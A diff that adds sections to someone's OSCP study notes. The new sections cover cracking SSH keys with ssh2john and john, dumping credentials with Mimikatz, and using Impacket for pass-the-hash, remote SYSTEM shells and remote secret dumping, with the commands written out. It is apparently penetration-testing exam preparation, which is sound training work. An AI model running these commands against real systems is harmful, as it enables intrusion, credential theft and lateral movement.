@@ -191,3 +191,129 @@ kpcli --kdb Database.kdbx
 > hashcat and johntheripper have different formats. Hashcat takes only pure hash while John has Database: (For this case.)
 
 ---
+
+### ssh
+
+**SSH private key cracking workflow:**
+
+**Step 1 — Find the private key:**
+Via LFI, directory traversal, or on a compromised machine:
+```
+/home/<user>/.ssh/id_rsa
+```
+
+**Step 2 — Check if it's passphrase protected:**
+```bash
+ssh -i id_rsa user@target
+```
+If it asks for a passphrase (not a password) → the key is encrypted.
+
+**Step 3 — Extract the hash:**
+```bash
+ssh2john id_rsa > ssh_hash.txt
+```
+
+**Step 4 — Crack with John:**
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
+```
+
+**Step 5 — Show cracked passphrase:**
+```bash
+john --show ssh_hash.txt
+```
+
+**Step 6 — Use the key with the passphrase:**
+```bash
+chmod 400 id_rsa
+ssh -i id_rsa user@target
+# Enter the cracked passphrase when prompted
+```
+
+**The pattern is identical to KeePass:**
+1. Find the encrypted file
+2. Extract hash with `<tool>2john`
+3. Crack with john or hashcat
+4. Use the cracked password to open it
+
+This same pattern works for almost anything:
+- `keepass2john` → KeePass
+- `ssh2john` → SSH keys
+- `zip2john` → encrypted zip files
+- `rar2john` → encrypted rar files
+- `office2john` → password protected Office docs
+
+---
+
+## Mimikatz 
+
+**Mimikatz** — a Windows post-exploitation tool that extracts credentials from memory.
+
+**What it can do:**
+
+1. **Dump plaintext passwords** from Windows memory (LSASS process)
+2. **Extract NTLM hashes** from logged-in users
+3. **Perform Pass-the-Hash** — authenticate using a hash without knowing the password
+4. **Kerberos attacks** — extract and forge tickets (Golden/Silver Ticket)
+5. **Dump SAM database** — local user password hashes
+
+**Key commands you'll use:**
+
+```powershell
+mimikatz.exe
+privilege::debug #permission to access memory
+token::elevate # escalate to SYSTEM, requires admin/SYSTEM priv
+sekurlsa::logonpasswords #dump everything
+lsadump::sam #dump sam file passwords
+```
+
+This dumps credentials for all users currently or recently logged into the machine.
+
+**Why it matters for OSCP:**
+
+After getting admin/SYSTEM on a Windows box, run Mimikatz to extract credentials. Those credentials often work on other machines in the network — that's lateral movement, especially critical in the AD section.
+
+---
+
+## Impacket
+
+**Impacket** — a collection of Python tools for interacting with Windows network protocols. It's your Swiss army knife for attacking Windows machines from Kali.
+
+**impacket-psexec** — gives you a SYSTEM shell on a remote Windows machine using credentials or hashes.
+
+```bash
+# With password
+impacket-psexec Administrator:password@192.168.177.212
+
+# With NTLM hash (Pass-the-Hash)
+impacket-psexec Administrator@192.168.177.212 -hashes :7a38310ea6f0027ee955abed1762964b
+```
+
+It works by uploading a service binary to the target via SMB, creating a Windows service, and executing it — giving you a SYSTEM shell.
+
+**Other important Impacket tools for OSCP:**
+
+```bash
+# Remote shell (similar to psexec, different method)
+impacket-wmiexec Administrator@target -hashes :hash
+
+# Dump credentials remotely without touching the target
+impacket-secretsdump Administrator@target -hashes :hash
+
+# MSSQL client
+impacket-mssqlclient sa:password@target -windows-auth
+
+# Kerberos attacks (AD)
+impacket-GetNPUsers domain/user -dc-ip target
+impacket-GetUserSPNs domain/user:password -dc-ip target
+```
+
+**Why Impacket matters:**
+It lets you do everything from Kali without uploading tools to the target. No need to transfer Mimikatz if you can run `secretsdump` remotely.
+
+**Key distinction:**
+- `psexec` → gives you a shell
+- `wmiexec` → gives you a shell (stealthier, no service created)
+- `secretsdump` → dumps credentials without a shell
+
+These become essential in AD modules 22-24.
